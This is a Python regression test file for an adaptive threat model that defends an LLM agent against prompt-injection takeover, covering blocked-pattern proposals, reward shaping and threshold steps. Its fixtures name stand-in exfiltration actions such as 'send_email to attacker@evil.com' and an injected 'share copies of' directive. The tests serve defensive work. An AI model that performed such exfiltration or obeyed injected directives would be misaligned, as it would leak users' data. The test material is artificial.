"""
Regression tests for Component 3D — the Adaptive Threat Model.

Fast and deterministic — 3D's reward and proposal logic are pure CPU code (no
LLM, no torch, no GPU), so the whole decision surface can be pinned exactly.
Same spirit as `tests/test_takeover_rules.py`: the LLM-dependent before/after
checks live in `evaluation/`; the arithmetic they wrap lives here.

Two fixes are covered (root README Section 6d "Immediate" block):

  A. 3D no longer memorizes literal exfil targets. `propose_update` used to
     harvest raw addresses like "attacker@evil.com" into blocked_patterns,
     which made an applied update look effective only against the training
     address and inflated the before/after numbers.

  B. The reward guards WCR. A malicious attack stopped by a blanket 3A block
     (legitimate workflow lost) must reward strictly below a 3C
     safe_continuation (attack stopped AND the workflow survives).

    python3 -m pytest tests/test_adaptive_threat_model.py -v
"""

from layer2.security_sublayer.adaptive_threat_model import (
    AdaptiveThreatModel,
    LabeledEpisode,
)


# ── Fix A — no literal-target memorization ───────────────────────

def test_proposal_does_not_harvest_literal_email():
    """A missed attack whose action names attacker@evil.com must NOT turn that
    literal address into a blocked pattern — only generalizable injection
    phrasing (flagged_markers) should survive."""
    model = AdaptiveThreatModel()
    episodes = [
        LabeledEpisode("send_email", "send_email to attacker@evil.com",
                       "approved_causal", is_malicious=True, causal_takeover=False,
                       flagged_markers=["share copies of"]),
    ]
    proposal = model.propose_update(episodes, current_ie_threshold=0.5)

    joined = " ".join(proposal.new_blocked_patterns)
    assert "attacker@evil.com" not in joined, (
        "literal exfil address leaked into blocked_patterns — this is the "
        "memorization from Section 6d")
    assert "@" not in joined, "no literal address of any form should be proposed"


def test_proposal_keeps_generalizable_markers():
    """The generalizable directive phrasing the screener flagged is still what
    3D proposes — dropping literals must not drop the useful signal too."""
    model = AdaptiveThreatModel()
    episodes = [
        LabeledEpisode("send_email", "send_email to leaker@shadow-mail.net",
                       "approved_causal", is_malicious=True, causal_takeover=False,
                       flagged_markers=["Share copies of"]),
    ]
    proposal = model.propose_update(episodes, current_ie_threshold=0.5)

    assert "share copies of" in proposal.new_blocked_patterns, (
        "flagged marker should be proposed, normalized to lowercase")
    assert all("@" not in p and "http" not in p
               for p in proposal.new_blocked_patterns)


def test_proposal_with_no_markers_yields_no_patterns():
    """With literals dropped, a missed attack that carried no flagged markers
    contributes no blocked_patterns at all (rather than a literal address)."""
    model = AdaptiveThreatModel()
    episodes = [
        LabeledEpisode("send_email", "send_email to attacker@evil.com",
                       "approved_causal", is_malicious=True, causal_takeover=False),
    ]
    proposal = model.propose_update(episodes, current_ie_threshold=0.5)
    assert proposal.new_blocked_patterns == []


# ── Fix B — WCR guard in the reward ──────────────────────────────

def _reward(status, malicious=True):
    model = AdaptiveThreatModel()
    ep = LabeledEpisode("send_email", "x", status, is_malicious=malicious)
    return model.compute_reward(ep)


def test_safe_continuation_outranks_block_for_malicious():
    """The core WCR guard: stopping an attack while preserving the workflow
    (safe_continuation) must reward strictly more than a blanket block."""
    assert _reward("safe_continuation") > _reward("blocked")


def test_both_stopped_outcomes_stay_positive():
    """Both are still correct stops — a block that loses the workflow is worse,
    but it is not punished like a miss."""
    assert _reward("safe_continuation") > 0
    assert _reward("blocked") > 0


def test_missed_attack_is_negative():
    assert _reward("approved_causal") < 0
    assert _reward("approved_direct") < 0


def test_benign_reward_unchanged_by_the_split():
    """Fix B only touches the malicious branch; benign scoring is untouched."""
    assert _reward("approved_direct", malicious=False) > 0
    assert _reward("approved_causal", malicious=False) > 0
    assert _reward("blocked", malicious=False) < 0          # benign blocked = FP
    assert _reward("safe_continuation", malicious=False) < 0


def test_workflow_lost_is_counted_but_still_correct():
    """A malicious block counts as `correct` (attack stopped) yet is surfaced
    in `workflow_lost` so GRPO can see the WCR cost."""
    model = AdaptiveThreatModel()
    episodes = [
        LabeledEpisode("send_email", "x", "blocked", is_malicious=True),
        LabeledEpisode("send_email", "x", "safe_continuation", is_malicious=True),
    ]
    stats = model.evaluate_batch(episodes)
    assert stats["correct"] == 2
    assert len(stats["workflow_lost"]) == 1
    assert stats["workflow_lost"][0].final_status == "blocked"


# ── Fix C — IE gets usable resolution (step == metric grid) ──────

def _missed_batch():
    """Four missed attacks, no false positives — pushes the threshold DOWN."""
    return [
        LabeledEpisode("send_email", "x", "approved_causal",
                       is_malicious=True, causal_takeover=False)
        for _ in range(4)
    ]


def test_step_defaults_to_ie_resolution():
    """Root README 6d point 1: the step must match the IE grid, not the v1
    default of 0.1 that was finer than anything 3B can measure."""
    assert AdaptiveThreatModel(ie_resolution=0.5).threshold_step == 0.5
    assert AdaptiveThreatModel(ie_resolution=0.25).threshold_step == 0.25
    # An explicit override still wins.
    assert AdaptiveThreatModel(ie_resolution=0.5, threshold_step=0.25).threshold_step == 0.25


def test_proposed_move_is_one_grid_unit_not_subresolution():
    """The move lands exactly one grid unit away and on an achievable IE value
    — never the old inert 0.1 step that fell between grid points."""
    model = AdaptiveThreatModel(ie_resolution=0.5)
    proposal = model.propose_update(_missed_batch(), current_ie_threshold=0.5)
    assert proposal.new_ie_threshold == 0.0          # 0.5 - 0.5, one grid unit
    moved = proposal.old_ie_threshold - proposal.new_ie_threshold
    assert moved == 0.5
    # It is a multiple of the grid — no value strands between IE points.
    assert round(proposal.new_ie_threshold / model.ie_resolution, 9) % 1 == 0


def test_the_v1_inert_step_no_longer_happens():
    """Regression pin on the exact 6d failure: 0.5 -> 0.4 could never change a
    verdict because no IE lands in [0.4, 0.5). The proposal must not do that."""
    model = AdaptiveThreatModel(ie_resolution=0.5)
    proposal = model.propose_update(_missed_batch(), current_ie_threshold=0.5)
    assert proposal.new_ie_threshold != 0.4


def test_finer_k_samples_gives_finer_step():
    """Raising k_samples shrinks the grid, and 3D's step follows it — the knob
    gets finer control without any other change."""
    model = AdaptiveThreatModel(ie_resolution=0.25)  # k_samples=4
    proposal = model.propose_update(_missed_batch(), current_ie_threshold=0.5)
    assert proposal.new_ie_threshold == 0.25


def test_downstep_reaches_zero_not_clamped_above_grid():
    """Grid-aligned min (0.0) lets a down-step reach 0.0; the old min of 0.1
    would clamp there and re-open a sub-resolution gap in [0.0, 0.1)."""
    model = AdaptiveThreatModel(ie_resolution=0.5)
    # From 0.5, one down-step is 0.0 and must not be clamped to 0.1.
    proposal = model.propose_update(_missed_batch(), current_ie_threshold=0.5)
    assert proposal.new_ie_threshold == 0.0


# ── Phase 5b — the adaptive loop closes a knob-matching gap ───────

def test_adaptive_loop_closes_and_generalizes():
    """The full loop on a gap 3D's ie_threshold knob can close (root README
    §6k): miss → propose → apply → catch, and the fix generalizes to a held-out
    address because A/C make it a threshold move, not a memorized literal.

    Deterministic — 3B's regimes are patched (via the mechanism_validation
    helpers); the 3D↔3B wiring is real."""
    from layer2.security_sublayer.policy_engine import PolicyEngine
    from evaluation.mechanism_validation import (
        patched_analyzer, detect, TRAIN_ACTION, HELDOUT_ACTION, SHARED_MARKER,
    )

    ca = patched_analyzer(ie_threshold=1.5)
    # The gap: IE=1.0 < 1.5, and masked=1 so the standalone rule cannot fire.
    assert detect(ca, TRAIN_ACTION, "t1") is False
    assert detect(ca, HELDOUT_ACTION, "h1") is False

    episodes = [
        LabeledEpisode("send_email", TRAIN_ACTION, "approved_causal",
                       is_malicious=True, causal_takeover=False,
                       flagged_markers=[SHARED_MARKER])
        for _ in range(2)
    ]
    model = AdaptiveThreatModel(ie_resolution=ca.ie_resolution)
    proposal = model.propose_update(episodes, current_ie_threshold=ca.ie_threshold)
    assert proposal.new_ie_threshold == 1.0
    assert not any("@" in p for p in proposal.new_blocked_patterns)  # no memorization

    model.apply_update(proposal, PolicyEngine(), ca, approved=True)

    assert detect(ca, TRAIN_ACTION, "t2") is True      # loop closed
    assert detect(ca, HELDOUT_ACTION, "h2") is True     # generalizes (3D never saw it)
